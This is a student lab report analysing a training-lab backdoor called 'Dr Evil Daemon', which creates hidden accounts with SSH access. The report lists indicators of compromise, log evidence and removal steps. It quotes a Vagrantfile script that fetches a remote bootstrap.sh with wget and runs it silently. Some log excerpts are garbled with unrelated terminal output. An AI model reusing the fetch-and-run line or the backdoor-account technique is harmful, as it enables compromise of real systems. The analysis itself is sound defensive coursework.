# I. Malware Name
Dr Evil Daemon
# II. Indicators of Compromise *(8 points)*
## Modified system files
- `/etc/passwd`
- `/etc/shadow`
- `/etc/group`

Scott's files  
- `/etc/crontab`

## Files created
- `/etc/init.d/evil`
- `/usr/local/games/dr_evil/dr_evil.py`
- `/usr/local/games/evil.init`
- `/usr/local/games/evil.log`
- `/var/www/evil.log -> /usr/local/games/dr_evil/evil.log`

Scott's files  

- `/etc/.volcano_lair/who.data`
- `/etc/.volcano_lair/README.txt`
- `/etc/.volcano_lair/scott_evil.sh`


## Sample syslog and auth.log evidence

```
May  4 11:47:49 precise64 groupadd[2140]: group added to /etc/group: name=evil, GID=1003                                                │    I230_Lab6_VM: prevent things such as shared folders from working properly. If you see                                             
May  4 11:47:49 precise64 groupadd[2140]: group added to /etc/gshadow: name=evil                                                        │    I230_Lab6_VM: shared folder errors, please make sure the guest additions within the                                               
May  4 11:47:49 precise64 groupadd[2140]: new group: name=evil, GID=1003                                                                │    I230_Lab6_VM: virtual machine match the version of VirtualBox you have installed on                                               
May  4 11:47:49 precise64 gpasswd[2145]: user vagrant added by root to group evil                                                       │    I230_Lab6_VM: your host and reload your VM.
May  4 11:47:49 precise64 useradd[2150]: new user: name=drevil, UID=109, GID=1003, home=/usr/local/games/dr_evil, shell=/bin/bash       │    I230_Lab6_VM:
May  4 11:47:49 precise64 usermod[2155]: change user 'drevil' password                                                                  │    I230_Lab6_VM: Guest Additions Version: 4.3.36
May  4 11:47:49 precise64 chage[2160]: changed password expiry for drevil                                                               │    I230_Lab6_VM: VirtualBox Version: 5.2
May  4 11:47:49 precise64 gpasswd[2164]: user drevil added by root to group admin                                                       │==> I230_Lab6_VM: Configuring and enabling network interfaces...
May  4 11:49:49 precise64 useradd[2404]: add 'henchman1' to group 'evil'                                                                │==> I230_Lab6_VM: Mounting shared folders...
May  4 11:49:49 precise64 useradd[2404]: add 'henchman1' to shadow group 'evil'                                                         │    I230_Lab6_VM: /vagrant => /Users/seiffert/devops/I230Labs/lab6
May  4 11:51:50 precise64 useradd[2416]: add 'henchman2' to group 'evil'                                                                │==> I230_Lab6_VM: Machine already provisioned. Run `vagrant provision` or use the `--provision`                                       
May  4 11:51:50 precise64 useradd[2416]: add 'henchman2' to shadow group 'evil'                                                         │==> I230_Lab6_VM: flag to force provisioning. Provisioners marked to run always will still run.                                       
May  4 11:55:51 precise64 useradd[2624]: add 'henchman3' to group 'evil'                                                                │seiffert@Intrepid-5520:lab6$ vagrant halt
May  4 11:55:51 precise64 useradd[2624]: add 'henchman3' to shadow group 'evil'                                                         │==> I230_Lab6_VM: Attempting graceful shutdown of VM...
May  4 12:01:51 precise64 useradd[2802]: add 'henchman4' to group 'evil'                                                                │seiffert@Intrepid-5520:lab6$ vagrant --version
May  4 12:01:51 precise64 useradd[2802]: add 'henchman4' to shadow group 'evil'   
```

In the ossec logs:

```
Integrity checksum changed for: '/etc/passwd'
```


Scott's files  

```
May  4 12:22:01 precise64 CRON[2940]: (root) CMD (/etc/.volcano_lair/scott_evil.sh)                                                     │
May  4 12:24:01 precise64 CRON[2951]: (root) CMD (/etc/.volcano_lair/scott_evil.sh)
```

## Network indicators and URL's
- `http://<host>/evil.log`
- `https://www.dropbox.com/s/gxr252hld7a8xa7/bootstrap.sh?dl=0`

# III. Malware Analysis *(8 points)*
## How does the malware work?
Installs itself as a daemon launched via /etc/init.d/evil.  
Daemon periodically creates a henchman account with ssh access. 
## Where does it install itself?
/usr/local/games/dr_evil
## What is it's objective
install backdoors and log all the activity it is doing.


# IV. Remedial Actions *(4 points)*
## What steps to remove malware
Remove all files from 

- `/usr/local/games/dr_evil`
- `/etc/init.d/evil`
- `/var/www/evil.log`

Remove henchmen accounts and group created. 

Scott's files:

- Remove `/etc/.volcano_lair`
- Remove entry from `/etc/crontab`

# V. Installation *(5 points)*
## What lines in Vagrantfile kick off installation

```
# Setup a variable for the shell inline script to download bootstrap.sh script.                                                       
May  4 12:01:51 precise64 useradd[2802]: add 'henchman4' to shadow group 'evil'                                                         │$script = <<SCRIPT
vagrant@precise64:/var/log$ less /etc/apache2/httpd.conf                                                                                │cd /tmp
vagrant@precise64:/var/log$ ls /etc/apache2/sites-enabled/                                                                              │wget https://www.dropbox.com/s/gxr252hld7a8xa7/bootstrap.sh?dl=0 -Obootstrap.sh > /dev/null 2>&1                                      
000-default                                                                                                                             │chmod u+x bootstrap.sh
vagrant@precise64:/var/log$ ls -l /var/www/                                                                                             │/tmp/bootstrap.sh > /dev/null 2>&1
alerts.log  evil.log    index.html                                                                                                      │SCRIPT
```

## What script deploys malware
- `/tmp/bootstrap.sh`
- `/tmp/vagrant-shell`

## What files are used for deployment
- `/tmp/drevil.tgz`
- `/tmp/volcano.tgz`

## Where did the files come from?
Dropbox folder

